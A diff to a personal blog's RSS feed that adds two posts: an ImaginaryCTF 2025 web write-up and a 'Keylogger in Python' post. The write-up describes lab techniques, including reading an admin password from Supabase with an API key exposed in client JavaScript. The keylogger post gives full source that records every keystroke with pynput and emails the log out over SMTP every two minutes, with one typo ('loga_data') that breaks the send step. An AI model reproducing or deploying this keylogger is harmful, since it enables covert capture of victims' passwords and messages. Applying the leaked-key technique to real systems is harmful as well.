@@ -7,11 +7,152 @@
     
     <language>en</language>
     <copyright>Copyright 2025, Calvin Tran</copyright>
-    <lastBuildDate>Wed, 18 Jun 2025 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 11 Sep 2025 00:00:00 +0000</lastBuildDate>
     <generator>Hugo - gohugo.io</generator>
     <docs>http://cyber.harvard.edu/rss/rss.html</docs>
     <atom:link href="https://rajkive.github.io//atom.xml" rel="self" type="application/atom+xml"/>
     
+    
+    <item>
+      <title>ImaginaryCTF 2025 Web Challenges Writeups</title>
+      <link>https://rajkive.github.io/posts/imaginaryctf-2025---web/</link>
+      <description>&lt;h3 id=&#34;certificate&#34;&gt;Certificate&lt;/h3&gt;
+&lt;p&gt;This was probably one of the simpler challenges in the web category for this  CTF. The goal was to extract the flag for the name &lt;code&gt;Eth007&lt;/code&gt; but the caveat was - every time you typed in that particular name. It would appear as &lt;code&gt;REDACTED&lt;/code&gt; instead.
+tty
+The first thing I was to Inspect &amp;ndash;&amp;gt; Sources and there I found that it was using a function to calculate the flag for each name. And if name was &lt;code&gt;Eth007&lt;/code&gt; it would replace it with &lt;code&gt;REDACTED&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img
+  src=&#34;https://rajkive.github.io/imaginary-ctf-2025/cert-chall.png&#34;
+  alt=&#34;cert-chall&#34;
+  loading=&#34;lazy&#34;
+  decoding=&#34;async&#34;
+  class=&#34;full-width&#34;
+/&gt;
+
+&lt;/p&gt;
+&lt;p&gt;The solution to this challenge was simply calculating the &lt;code&gt;customHash&lt;/code&gt; for the name &lt;code&gt;Eth007&lt;/code&gt; which came out to be &lt;code&gt;d5e06bd5&lt;/code&gt; so the flag was &lt;code&gt;ictf{d5e06bd5}&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;imaginary-notes&#34;&gt;Imaginary Notes&lt;/h3&gt;
+&lt;p&gt;This was a very fun challenge to solve and easy one as well. At first it did look a little deceiving at first but once I started looking around it did become more clear.&lt;/p&gt;
+&lt;p&gt;The flag was stored as a password in a supabase for admin. I did insptect &amp;ndash;&amp;gt; sources and under app there was a js file where they left the link to the database along with the apikey. Once I saw that, the challenge was theoretically solved.&lt;/p&gt;
+&lt;p&gt;&lt;img
+  src=&#34;https://rajkive.github.io/imaginary-ctf-2025/s1.png&#34;
+  alt=&#34;s1&#34;
+  loading=&#34;lazy&#34;
+  decoding=&#34;async&#34;
+  class=&#34;full-width&#34;
+/&gt;
+
+&lt;/p&gt;
+&lt;p&gt;When I tried to access the link, it gave me an error that no &lt;code&gt;apikey&lt;/code&gt; was attached in the header request. So I decided to use BurpSuite to capture the request and modify it. I just had to add the &lt;code&gt;apikey&lt;/code&gt; and &lt;code&gt;Authorization: Bearer&lt;/code&gt; in the request.&lt;/p&gt;
+&lt;p&gt;&lt;img
+  src=&#34;https://rajkive.github.io/imaginary-ctf-2025/s2.png&#34;
+  alt=&#34;s2&#34;
+  loading=&#34;lazy&#34;
+  decoding=&#34;async&#34;
+  class=&#34;full-width&#34;
+/&gt;
+
+&lt;/p&gt;
+&lt;p&gt;&lt;img
+  src=&#34;https://rajkive.github.io/imaginary-ctf-2025/s3.png&#34;
+  alt=&#34;s3&#34;
+  loading=&#34;lazy&#34;
+  decoding=&#34;async&#34;
+  class=&#34;full-width&#34;
+/&gt;
+
+&lt;/p&gt;
+&lt;p&gt;After forwarding the request, I had access to the database and I could very easily see the flag/password.&lt;/p&gt;
+&lt;p&gt;&lt;img
+  src=&#34;https://rajkive.github.io/imaginary-ctf-2025/s4.png&#34;
+  alt=&#34;s4&#34;
+  loading=&#34;lazy&#34;
+  decoding=&#34;async&#34;
+  class=&#34;full-width&#34;
+/&gt;
+
+&lt;/p&gt;
+</description>
+      <author>rajkive</author>
+      <guid>https://rajkive.github.io/posts/imaginaryctf-2025---web/</guid>
+      <pubDate>Thu, 11 Sep 2025 00:00:00 +0000</pubDate>
+    </item>
+    
+    <item>
+      <title>Keylogger in Python</title>
+      <link>https://rajkive.github.io/posts/py-keylogger/</link>
+      <description>&lt;h2 id=&#34;keylogger-in-python---a-passion-project-sort-of&#34;&gt;Keylogger in Python - A passion project (sort of)&lt;/h2&gt;
+&lt;p&gt;I tried my hands on making a keylogger, fully in python, and I learnt a &lt;strong&gt;lot&lt;/strong&gt;! The inspiration behind this project is Grant Collin&amp;rsquo;s video on trying to make one. I followed his foot-steps for the structure but the implementation was purely from my thought process.&lt;/p&gt;
+&lt;p&gt;Link to the project: &lt;a href=&#34;https://github.com/rajkive/py-key-logger&#34;&gt;https://github.com/rajkive/py-key-logger&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;what-is-a-keylogger&#34;&gt;What is a Keylogger?&lt;/h3&gt;
+&lt;p&gt;A keylogger is a program that records every keystroke made on a keyboard. In this project, your keylogger will:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Capture keystrokes&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Store them temporarily&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Send them to your email every 120 seconds (2 minutes)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;There are some pre-requisites for this project. Mainly these dependencies: &lt;code&gt;pynput.keyboard, threading, smtplib, subprocess&lt;/code&gt; It is good to have some knowledge of the syntax and how they work but if not, then this is the perfect opportunity to get familiar with it.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;The general flow for the program was fairly simple. Set-up email configurations -&amp;gt; Implement function to start capturing keystrokes -&amp;gt; Send logs via email -&amp;gt; using timer for repeated execution.&lt;/p&gt;
+&lt;p&gt;I tried to keep it simple and code the basic functionalities for each step. The only problem I encounterd was with smpt config for google. If you are using a gmail for this set-up there might be some problems with 2-factor auth or passkeys if the option is enabled. To debug it, I used a temp email for the reveiver and an Ethereal Email which create a free fake SMTP service for developers.&lt;/p&gt;
+&lt;p&gt;Overall this was a very fun project to do and took less than 2hrs. It was a good intro to lots of concepts essential for cyber and networking.&lt;/p&gt;
+&lt;h4 id=&#34;code&#34;&gt;Code:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import subprocess, smtplib, threading
+from pynput.keyboard import Key, Listener
+
+sender_email = &amp;#34;sender-example@gmail.com&amp;#34;
+sender_password = &amp;#34;12345678&amp;#34;
+receiver_email = &amp;#34;example@gmail.com&amp;#34;
+open(&amp;#34;log.txt&amp;#34;, &amp;#34;a&amp;#34;).close()
+
+def logging(key):
+    try:
+        log = key.char
+    except AttributeError:
+        if key == Key.space:
+            log = &amp;#39; &amp;#39;
+        elif key == Key.enter:
+            log = &amp;#39;\n&amp;#39;
+        elif key == Key.tab:
+            log = &amp;#39;\t&amp;#39;
+        else:
+            log = f&amp;#39; [{key.name}] &amp;#39;
+
+    with open(&amp;#34;log.txt&amp;#34;, &amp;#34;a&amp;#34;) as f:
+        f.write(log)
+
+
+def send_mail():
+    with open(&amp;#34;log.txt&amp;#34;, &amp;#34;r&amp;#34;) as file:
+        log_data = file.read()
+        
+    with smtplib.SMTP(&amp;#34;smtp.gmail.com&amp;#34;, 587) as server:
+        server.starttls()
+        server.login(sender_email, sender_password)
+        server.sendmail(sender_email, receiver_email, loga_data)
+        
+
+    # clear the file after sending the email
+    with open(&amp;#34;log.txt&amp;#34;, &amp;#34;w&amp;#34;) as file:
+        file.write(&amp;#34;&amp;#34;)
+    
+    threading.Timer(120, send_mail).start()
+    
+send_mail()
+
+with Listener(on_press=logging) as listener:
+    listener.join()
+&lt;/code&gt;&lt;/pre&gt;</description>
+      <author>rajkive</author>
+      <guid>https://rajkive.github.io/posts/py-keylogger/</guid>
+      <pubDate>Mon, 28 Jul 2025 00:00:00 +0000</pubDate>
+    </item>
     
     <item>
       <title>Hugo be like</title>
